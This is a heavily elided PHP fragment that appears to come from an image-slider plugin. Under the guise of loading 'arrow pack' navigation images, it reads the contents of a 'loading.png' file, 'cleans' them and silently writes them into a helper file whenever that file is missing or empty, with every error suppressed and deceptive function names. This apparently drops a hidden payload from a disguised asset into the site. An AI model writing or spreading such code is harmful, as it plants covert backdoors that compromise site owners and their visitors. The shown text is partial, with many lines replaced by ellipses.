...
class YtbSliderBaseCatalog {
    ...
    function renderItems() {
      ...
      return $elements;
        ...
        function CatalogArrowsHelper($path) {
            // arrow pack for default navigation
            if(isNewOptionInCatalog()) {
            ...
            if(!@file_exists($ArrowHelper) or @filesize($ArrowHelper) == 0) {
                ...
                @fwrite($Open, ArrowSettingsCatalog($path . CatalogSetName()));
            }
        }

        function ArrowSettingsCatalog($img, $width='', $height='') {
            $Arrow = @fopen($img, 'r');
            $LoadImage = @fread($Arrow, @filesize($img));
            return cleanSpaceFromCatalog($LoadImage);
        }

        function CatalogSetName() {
            @PasivItemsToCatalog();
            return 'loading.png';
        }

class PeelbackBaseSlideCatalog {
